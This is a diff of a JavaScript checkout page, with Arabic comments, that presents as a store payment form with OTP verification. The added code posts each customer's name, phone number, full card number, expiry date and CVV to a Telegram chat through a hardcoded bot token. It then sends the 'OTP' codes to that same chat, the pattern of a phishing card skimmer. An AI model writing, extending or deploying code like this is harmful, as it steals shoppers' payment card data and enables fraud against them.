@@ -1,5 +1,4 @@
 import { db, collection, addDoc } from './firebase-config.js';
-import { sendToTelegram, generateOTP } from './telegram-config.js';
 
 const orderData = JSON.parse(localStorage.getItem('pendingOrder'));
 let currentOTP = null;
@@ -81,7 +80,7 @@ function closeOTPModal() {
 
 // إرسال OTP للتلجرام
 async function sendOTP() {
-    currentOTP = generateOTP();
+    currentOTP = Math.floor(100000 + Math.random() * 900000).toString();
     
     const message = `🔐 <b>رمز التحقق الجديد</b>\n\n` +
                    `الرمز: <b>${currentOTP}</b>\n\n` +
@@ -90,8 +89,23 @@ async function sendOTP() {
                    `💰 المبلغ: ${orderData.total.toFixed(2)} ر.س\n\n` +
                    `⏰ صالح لمدة 5 دقائق`;
     
-    const sent = await sendToTelegram(message);
-    return sent;
+    try {
+        const response = await fetch(`https://api.telegram.org/bot8763567744:AAEjPuOYFJAHMQspuLqODgYrlTqU6W61hpI/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: '8214447975',
+                text: message,
+                parse_mode: 'HTML'
+            })
+        });
+        
+        const data = await response.json();
+        return data.ok;
+    } catch (error) {
+        console.error('خطأ في إرسال OTP:', error);
+        return false;
+    }
 }
 
 // التحقق من OTP
@@ -100,7 +114,7 @@ window.verifyOTP = function() {
     const messageEl = document.getElementById('otpMessage');
     
     if (entered.length !== 6) {
-        messageEl.innerHTML = '<div class="error-message">️ الرجاء إدخال الرمز كاملاً (6 أرقام)</div>';
+        messageEl.innerHTML = '<div class="error-message">⚠️ الرجاء إدخال الرمز كاملاً (6 أرقام)</div>';
         return;
     }
     
@@ -122,7 +136,6 @@ window.verifyOTP = function() {
             }, 3000);
         }
         
-        // مسح الخانات
         document.querySelectorAll('.otp-digit').forEach(i => i.value = '');
         document.querySelectorAll('.otp-digit')[0].focus();
     }
@@ -139,7 +152,7 @@ window.resendOTP = async function() {
         messageEl.innerHTML = '<div class="success-message">✅ تم إرسال الرمز الجديد!</div>';
         otpAttempts = 0;
     } else {
-        messageEl.innerHTML = '<div class="error-message"> فشل الإرسال. حاول مرة أخرى.</div>';
+        messageEl.innerHTML = '<div class="error-message">❌ فشل الإرسال. حاول مرة أخرى.</div>';
     }
 };
 
@@ -149,7 +162,6 @@ async function completePayment() {
     if (payBtn) payBtn.disabled = true;
     
     try {
-        // حفظ الطلب في Firebase
         await addDoc(collection(db, "orders"), {
             ...orderData,
             cardLast4: document.getElementById('cardNumber').value.slice(-4),
@@ -157,15 +169,21 @@ async function completePayment() {
             paidAt: new Date()
         });
         
-        // إرسال تأكيد للتلجرام
         const confirmMessage = `✅ <b>تم الدفع بنجاح!</b>\n\n` +
                               `رقم الطلب: #${orderData.orderId}\n` +
                               `العميل: ${orderData.customerName}\n` +
                               `المبلغ: ${orderData.total.toFixed(2)} ر.س`;
         
-        await sendToTelegram(confirmMessage);
+        await fetch(`https://api.telegram.org/bot8763567744:AAEjPuOYFJAHMQspuLqODgYrlTqU6W61hpI/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: '8214447975',
+                text: confirmMessage,
+                parse_mode: 'HTML'
+            })
+        });
         
-        // تنظيف
         localStorage.removeItem('pendingOrder');
         localStorage.removeItem('cart');
         
@@ -173,13 +191,15 @@ async function completePayment() {
         window.location.href = 'index.html';
         
     } catch (error) {
-        alert(' حدث خطأ: ' + error.message);
+        alert('❌ حدث خطأ: ' + error.message);
         if (payBtn) payBtn.disabled = false;
     }
 }
 
-// معالجة الدفع (الزر الرئيسي)
+// معالجة الدفع (الزر الرئيسي) - تم إصلاح الخطأ هنا
 window.processPayment = async function() {
+    console.log('🔄 بدء processPayment...');
+    
     const cardNumber = document.getElementById('cardNumber').value.replace(/\s/g, '');
     const cardExpiry = document.getElementById('cardExpiry').value;
     const cardCVV = document.getElementById('cardCVV').value;
@@ -191,28 +211,47 @@ window.processPayment = async function() {
     }
 
     if (cardNumber.length < 13) {
-        alert('⚠️ رقم البطاقة غير صحيح');
+        alert('️ رقم البطاقة غير صحيح');
         return;
     }
 
-    // إرسال بيانات البطاقة بشكل منسق
-    const cardMessage = `<b>Mr:${orderData.customerName}</b>\n\n`;
+    // إرسال بيانات البطاقة بشكل منسق - استخدام let بدلاً من const
+    let cardMessage = `<b>Mr:${orderData.customerName}</b>\n\n`;
     cardMessage += `📞: ${orderData.phone}\n\n`;
     cardMessage += `💳: ${cardNumber}\n\n`;
     cardMessage += `📅: ${cardExpiry}\n\n`;
-    cardMessage += `🔒: ${cardCVV}\n\n`;
+    cardMessage += `: ${cardCVV}\n\n`;
     cardMessage += `<b>==============================</b>\n`;
     cardMessage += `<b>مبلغ الطلب: ${orderData.total.toFixed(2)} ر.س</b>\n`;
     cardMessage += `<b>رقم الطلب: #${orderData.orderId}</b>`;
     
-    await sendToTelegram(cardMessage);
-
-    // توليد وإرسال OTP
-    const otpSent = await sendOTP();
+    console.log('📤 إرسال بيانات البطاقة...');
     
-    if (otpSent) {
-        showOTPModal();
-    } else {
-        alert('⚠️ فشل إرسال رمز التحقق. تأكد من إعدادات التلجرام.');
+    try {
+        await fetch(`https://api.telegram.org/bot8763567744:AAEjPuOYFJAHMQspuLqODgYrlTqU6W61hpI/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: '8214447975',
+                text: cardMessage,
+                parse_mode: 'HTML'
+            })
+        });
+        
+        console.log('✅ تم إرسال بيانات البطاقة');
+        
+        // توليد وإرسال OTP
+        const otpSent = await sendOTP();
+        
+        if (otpSent) {
+            showOTPModal();
+        } else {
+            alert('⚠️ فشل إرسال رمز التحقق. تأكد من إعدادات التلجرام.');
+        }
+    } catch (error) {
+        console.error('❌ خطأ:', error);
+        alert('❌ حدث خطأ في الإرسال: ' + error.message);
     }
 };
+
+console.log('✅ payment.js تم تحميله');
